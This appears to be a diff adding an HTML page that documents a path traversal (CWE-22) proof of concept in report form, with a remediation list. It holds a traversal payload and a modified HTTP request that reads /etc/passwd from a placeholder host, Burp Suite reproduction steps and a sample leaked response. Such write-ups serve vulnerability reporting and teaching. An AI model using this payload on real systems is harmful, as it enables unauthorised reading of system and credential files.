@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Path Traversal PoC</title>
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:Arial, sans-serif;
+    }
+
+    body{
+      background:#0f172a;
+      color:white;
+      padding:40px;
+    }
+
+    .container{
+      max-width:1000px;
+      margin:auto;
+      background:#111827;
+      border-radius:15px;
+      padding:30px;
+      box-shadow:0 0 20px rgba(0,0,0,0.5);
+    }
+
+    h1{
+      color:#38bdf8;
+      margin-bottom:20px;
+    }
+
+    h2{
+      margin-top:25px;
+      color:#facc15;
+    }
+
+    .box{
+      background:#1e293b;
+      padding:15px;
+      border-radius:10px;
+      margin-top:10px;
+      overflow:auto;
+      border-left:5px solid #38bdf8;
+    }
+
+    code{
+      color:#4ade80;
+      white-space:pre-wrap;
+    }
+
+    button{
+      margin-top:20px;
+      padding:12px 20px;
+      border:none;
+      background:#38bdf8;
+      color:black;
+      font-weight:bold;
+      border-radius:8px;
+      cursor:pointer;
+      transition:0.3s;
+    }
+
+    button:hover{
+      background:#0ea5e9;
+    }
+
+    .response{
+      margin-top:20px;
+      display:none;
+    }
+
+    ul{
+      margin-left:20px;
+      margin-top:10px;
+    }
+
+    .severity{
+      color:red;
+      font-weight:bold;
+      font-size:20px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <h1>Directory Traversal Vulnerability PoC</h1>
+
+  <h2>Vulnerability Type</h2>
+  <div class="box">
+    <code>Directory Traversal / Path Traversal</code>
+  </div>
+
+  <h2>CWE</h2>
+  <div class="box">
+    <code>CWE-22</code>
+  </div>
+
+  <h2>Affected Endpoint</h2>
+  <div class="box">
+    <code>
+GET /image?filename=21.jpg HTTP/2
+    </code>
+  </div>
+
+  <h2>Payload Used</h2>
+  <div class="box">
+    <code>
+../../../etc/passwd
+    </code>
+  </div>
+
+  <h2>Modified Request</h2>
+  <div class="box">
+    <code>
+GET /image?filename=../../../etc/passwd HTTP/2
+Host: vulnerable-target.com
+Cookie: session=YOUR_SESSION
+    </code>
+  </div>
+
+  <h2>Steps to Reproduce</h2>
+  <div class="box">
+    <ol>
+      <li>Open application in Burp Suite.</li>
+      <li>Capture image/file request.</li>
+      <li>Modify filename parameter.</li>
+      <li>Insert traversal payload.</li>
+      <li>Forward request.</li>
+      <li>Observe sensitive file disclosure.</li>
+    </ol>
+  </div>
+
+  <button onclick="showResponse()">
+    Show Vulnerable Response
+  </button>
+
+  <div class="response" id="responseBox">
+
+    <h2>Successful Response Example</h2>
+
+    <div class="box">
+      <code>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+      </code>
+    </div>
+
+  </div>
+
+  <h2>Impact</h2>
+  <div class="box">
+    <ul>
+      <li>Sensitive Information Disclosure</li>
+      <li>Credential Exposure</li>
+      <li>Configuration Leakage</li>
+      <li>Source Code Disclosure</li>
+    </ul>
+  </div>
+
+  <h2>Severity</h2>
+  <div class="box">
+    <span class="severity">HIGH</span>
+  </div>
+
+  <h2>Remediation</h2>
+  <div class="box">
+    <ul>
+      <li>Validate user input</li>
+      <li>Block ../ sequences</li>
+      <li>Use allowlisted files only</li>
+      <li>Restrict filesystem access</li>
+      <li>Use secure file APIs</li>
+    </ul>
+  </div>
+
+</div>
+
+<script>
+  function showResponse(){
+    document.getElementById("responseBox").style.display = "block";
+  }
+</script>
+
+</body>
+</html>
